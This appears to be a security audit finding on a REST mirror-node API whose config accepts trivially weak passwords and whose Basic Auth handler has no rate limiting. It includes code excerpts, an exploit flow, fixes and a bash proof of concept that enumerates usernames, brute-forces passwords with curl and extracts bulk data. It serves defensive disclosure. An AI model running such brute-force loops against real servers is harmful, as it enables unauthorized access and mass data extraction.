### Title
Weak Password Accepted by `parseUsersConfig()` Combined with No Brute-Force Protection Enables Credential Compromise and Elevated Query Limit Bypass

### Summary
`parseUsersConfig()` in `rest/config.js` only checks that `user.password` is a non-empty string, accepting arbitrarily short or trivial passwords (e.g., `'a'`). The `authHandler.js` middleware performs no rate limiting, lockout, or failed-attempt tracking on Basic Auth requests. An external attacker with no privileges can enumerate usernames and brute-force passwords to gain elevated per-user query limits and extract bulk transaction/account data beyond the default cap.

### Finding Description
**Code location:** `rest/config.js`, `parseUsersConfig()`, lines 188–216; `rest/middleware/authHandler.js`, `findUser()`, lines 10–13.

**Root cause — `parseUsersConfig()`:**
```js
// rest/config.js lines 199-201
if (!user.password || typeof user.password !== 'string') {
  throw new InvalidConfigError(`users[${index}] must have a password string`);
}
```
The only check is truthiness (`!user.password`) and type. A single-character string `'a'` is truthy and a string, so it passes. No minimum length, no character-class requirement, no entropy check is performed. [1](#0-0) 

**Root cause — `authHandler.js`:**
```js
// rest/middleware/authHandler.js lines 10-13
const findUser = (username, password) => {
  const users = config.users || [];
  return users.find((user) => tsscmp(user.username, username) && tsscmp(user.password, password)) || null;
};
```
`tsscmp` prevents timing side-channels but does nothing to limit attempt frequency. There is no counter, no lockout, no IP throttling. [2](#0-1) 

**No rate limiting anywhere in the REST server:** A `grep` across all `rest/**/*.js` for `rateLimit`, `rate-limit`, `express-rate`, `brute`, `lockout`, `failedAttempt` returns zero matches. `server.js` registers `authHandler` as global middleware with no throttling wrapper. [3](#0-2) 

**Exploit flow:**
1. Operator configures a user with a weak password (e.g., `password: 'a'`, `limit: 10000`) — `parseUsersConfig()` accepts it without error.
2. Attacker observes a 401 vs. no-auth response difference to confirm a username exists (usernames may be guessable: `admin`, `premium`, `api`, etc.).
3. Attacker sends rapid `GET /api/v1/transactions?limit=10000` requests with `Authorization: Basic <base64(username:candidate)>` headers, cycling through a small password space.
4. On match, the server sets `httpContext.set(userLimitLabel, user.limit)` and the attacker's subsequent requests bypass the default `max` response limit. [4](#0-3) 

### Impact Explanation
A successful brute-force grants the attacker the authenticated user's custom `limit`, which can be orders of magnitude above the default `max` (default max is 100; a configured user limit is unbounded). This allows bulk extraction of transaction history, account balances, and token data in far fewer paginated requests than an unauthenticated caller. While this is a read-only mirror API (no direct fund movement), bulk data extraction at elevated limits constitutes unauthorized privilege escalation and can expose sensitive on-chain activity patterns at scale. [5](#0-4) 

### Likelihood Explanation
The attack requires only HTTP access to the public REST endpoint — no credentials, no internal network access. If any configured user has a password of 1–6 characters (which `parseUsersConfig()` explicitly permits), a dictionary or brute-force attack over a standard character set is trivially fast with no server-side impediment. The `tsscmp` timing-safe comparison eliminates timing oracles but does not slow down or block repeated attempts. The attack is fully repeatable and automatable. [6](#0-5) 

### Recommendation
1. **In `parseUsersConfig()`**: Enforce a minimum password length (e.g., ≥ 16 characters) and reject passwords that appear in common wordlists or fail a minimum entropy check.
2. **In `authHandler.js`**: Add per-IP and per-username failed-attempt tracking with exponential back-off or a hard lockout threshold (e.g., 5 failures → 15-minute lockout).
3. **In `server.js`**: Apply an `express-rate-limit` middleware scoped to routes that process an `Authorization` header, independent of application-level logic.
4. **Operational**: Document that user passwords must be generated with a CSPRNG and stored hashed (currently stored in plaintext in the config). [7](#0-6) 

### Proof of Concept
```bash
# 1. Confirm a username exists (401 vs. 200/no-auth difference)
curl -i -u "admin:x" https://<mirror-node>/api/v1/transactions
# HTTP 401 → username "admin" is configured

# 2. Brute-force single-character passwords (trivial if parseUsersConfig allowed 'a'..'z')
for c in {a..z}; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    -u "admin:$c" \
    "https://<mirror-node>/api/v1/transactions?limit=1")
  echo "$c -> $CODE"
  [ "$CODE" = "200" ] && echo "FOUND: admin:$c" && break
done

# 3. Once authenticated, extract bulk data beyond default max
curl -u "admin:<found_password>" \
  "https://<mirror-node>/api/v1/transactions?limit=10000" \
  | jq '.transactions | length'
# Returns up to the user's configured limit, far exceeding the unauthenticated cap of 100
```

```javascript
const parseUsersConfig = () => {
  const users = getConfig().users || [];

  if (!Array.isArray(users)) {
    throw new InvalidConfigError('users configuration must be an array');
  }

  users.forEach((user, index) => {
    if (!user.username || typeof user.username !== 'string') {
      throw new InvalidConfigError(`users[${index}] must have a username string`);
    }
    if (!user.password || typeof user.password !== 'string') {
      throw new InvalidConfigError(`users[${index}] must have a password string`);
    }
    if (user.limit !== undefined) {
      const limit = parseInt(user.limit, 10);
      if (Number.isNaN(limit) || limit <= 0) {
        throw new InvalidConfigError(`users[${index}].limit must be a positive integer`);
      }
      user.limit = limit;
    }
  });

  const usernames = users.map((u) => u.username);
  const duplicates = usernames.filter((name, index) => usernames.indexOf(name) !== index);
  if (duplicates.length > 0) {
    throw new InvalidConfigError(`Duplicate usernames in users configuration: ${duplicates.join(', ')}`);
  }
};
```
